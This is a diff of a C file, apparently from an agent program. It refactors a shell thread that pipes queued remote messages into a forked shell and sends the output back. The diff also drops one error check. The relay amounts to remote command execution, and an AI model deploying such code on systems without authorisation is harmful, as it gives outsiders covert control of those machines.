@@ -34,7 +34,7 @@ typedef struct Shell_Pipes{
 	Pipes pipes[3];
 } Shell_Pipes;
 
-STATIC int execute_shell(){
+static int execute_shell(){
 	pid_t pid;
 	Shell_Pipes shell_pipes = {0};
 	Queue_Message* message;
@@ -46,18 +46,18 @@ STATIC int execute_shell(){
 	for (int i = 0; i < 3; i++){
 		if (pipe(shell_pipes.pipes[i].pipefd) == -1){
 			printf("ERROR pipe failed: %d\n", errno);
-			return RET_ERROR;
+			return RET_FATAL_ERROR;
 		}
 	}
 	
 	// we don't want to block on read for STDOUT PIPE_OUT and STDERR PIPE_OUT
 	if (fcntl(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
 		printf("ERROR nonblocking pipe option failed\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 	if (fcntl(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
 		printf("ERROR nonblocking pipe option failed\n");
-		return RET_ERROR;
+		return RET_FATAL_ERROR;
 	}
 		
 	pid = fork();
@@ -100,7 +100,7 @@ STATIC int execute_shell(){
 				debug_print("dequeued message for shell: %s, %d\n", message->buffer, message->size);
 				if ((nbytes = write(shell_pipes.pipes[STDIN].pipefd[PIPE_IN], message->buffer, message->size)) == -1){
 					printf("ERROR write to shell\n");
-					ret_val =  RET_ERROR;
+					ret_val =  RET_FATAL_ERROR;
 					break;
 				}
 				
@@ -114,7 +114,7 @@ STATIC int execute_shell(){
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDOUT read from shell: %d\n", errno);
-					ret_val =  RET_ERROR;
+					ret_val =  RET_FATAL_ERROR;
 					break;
 				}
 			}
@@ -127,9 +127,7 @@ STATIC int execute_shell(){
 				
 				debug_print("got command response: %s\n", buffer);
 				
-				if (agent_prepare_message(TYPE_COMMAND, buffer, nbytes) != RET_OK){
-					printf("ERROR agent_prepare_message error\n");
-				}
+				agent_prepare_message(TYPE_COMMAND, buffer, nbytes);
 			}
 			
 			// Read from STDERR
@@ -138,7 +136,7 @@ STATIC int execute_shell(){
 			if (nbytes == -1){
 				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
 					printf("ERROR STDERR read from shell: %d\n", errno);
-					ret_val =  RET_ERROR;
+					ret_val =  RET_FATAL_ERROR;
 					break;
 				}
 			}
@@ -167,7 +165,7 @@ void *shell_thread(void *vargp){
 	while (!agent_close_flag && !agent_disconnect_flag){
 		if ((ret_val = execute_shell()) != RET_OK){
 			printf("ERROR execute shell\n");
-			exit(RET_ERROR);
+			exit(RET_FATAL_ERROR);
 		}
 	}
 
